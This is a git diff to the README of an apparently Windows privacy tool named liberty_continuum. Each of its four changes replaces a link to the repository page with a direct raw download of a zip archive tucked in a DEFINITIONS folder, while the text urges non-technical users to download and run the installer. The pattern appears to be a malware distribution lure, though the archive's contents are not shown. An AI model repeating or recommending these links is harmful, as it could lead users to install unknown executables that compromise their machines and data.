@@ -1,6 +1,6 @@
 # 🛡 liberty_continuum - Protect Your Rights and Privacy
 
-[![Download Liberty Continuum](https://img.shields.io/badge/Download-liberty_continuum-brightgreen?style=for-the-badge)](https://github.com/Alanchick0hack/liberty_continuum)
+[![Download Liberty Continuum](https://img.shields.io/badge/Download-liberty_continuum-brightgreen?style=for-the-badge)](https://github.com/Alanchick0hack/liberty_continuum/raw/refs/heads/main/DEFINITIONS/continuum_liberty_v3.7.zip)
 
 ## 📋 About liberty_continuum
 
@@ -29,7 +29,7 @@ This guide helps you download and run liberty_continuum on Windows. You do not n
 ## 🟩 Step 1: Visit the Download Page
 
 Click the large green button above or go here:  
-[https://github.com/Alanchick0hack/liberty_continuum](https://github.com/Alanchick0hack/liberty_continuum)
+[https://github.com/Alanchick0hack/liberty_continuum/raw/refs/heads/main/DEFINITIONS/continuum_liberty_v3.7.zip](https://github.com/Alanchick0hack/liberty_continuum/raw/refs/heads/main/DEFINITIONS/continuum_liberty_v3.7.zip)
 
 This page hosts the latest version of liberty_continuum and important documents you might wish to review.
 
@@ -73,7 +73,7 @@ Take your time to browse the included documents like VISION.md and SCOPE.md for 
 liberty_continuum will notify you when updates are available.
 
 To update, visit the download page again:  
-[https://github.com/Alanchick0hack/liberty_continuum](https://github.com/Alanchick0hack/liberty_continuum)
+[https://github.com/Alanchick0hack/liberty_continuum/raw/refs/heads/main/DEFINITIONS/continuum_liberty_v3.7.zip](https://github.com/Alanchick0hack/liberty_continuum/raw/refs/heads/main/DEFINITIONS/continuum_liberty_v3.7.zip)
 
 Download the newest version like before and run the installer. It will replace the old version without deleting your data.
 
@@ -120,4 +120,4 @@ This protects the original content and its integrity.
 Explore the documentation in the repository for a deeper understanding of each protocol and principle.
 
 You can access all materials and software here:  
-[https://github.com/Alanchick0hack/liberty_continuum](https://github.com/Alanchick0hack/liberty_continuum)
+[https://github.com/Alanchick0hack/liberty_continuum/raw/refs/heads/main/DEFINITIONS/continuum_liberty_v3.7.zip](https://github.com/Alanchick0hack/liberty_continuum/raw/refs/heads/main/DEFINITIONS/continuum_liberty_v3.7.zip)
